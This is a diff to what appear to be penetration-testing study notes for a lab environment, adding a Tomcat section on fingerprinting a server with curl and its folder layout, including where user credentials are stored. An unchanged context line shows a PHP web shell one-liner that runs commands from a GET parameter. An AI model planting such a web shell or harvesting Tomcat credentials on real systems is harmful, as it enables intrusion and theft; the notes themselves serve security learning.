@@ -264,4 +264,16 @@ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
 * can exploit this using Metasploit, but we must first log in and obtain a valid session cookie
 
 # Tomcat
+* Apache tomcat is an open-source web server that hosts apps written in Java
+* Tomcat servers can be identified by the Server header in the HTTP response
+* Can also detect with this script:
+```bash
+curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
+```
+* The `bin` folder stores scripts and binaries needed to start and run a Tomcat server
+* The `conf` folder stores various configuration files used by Tomcat. The `tomcat-users.xml` file stores user credentials and their assigned roles
+* The `lib` folder holds the various JAR files needed for the correct functioning of Tomcat
+* The `logs` and `temp` folders store temporary log files
+* The `webapps` folder is the default webroot of Tomcat and hosts all the applications
+* The `work` folder acts as a cache and is used to store data during runtime
 * 
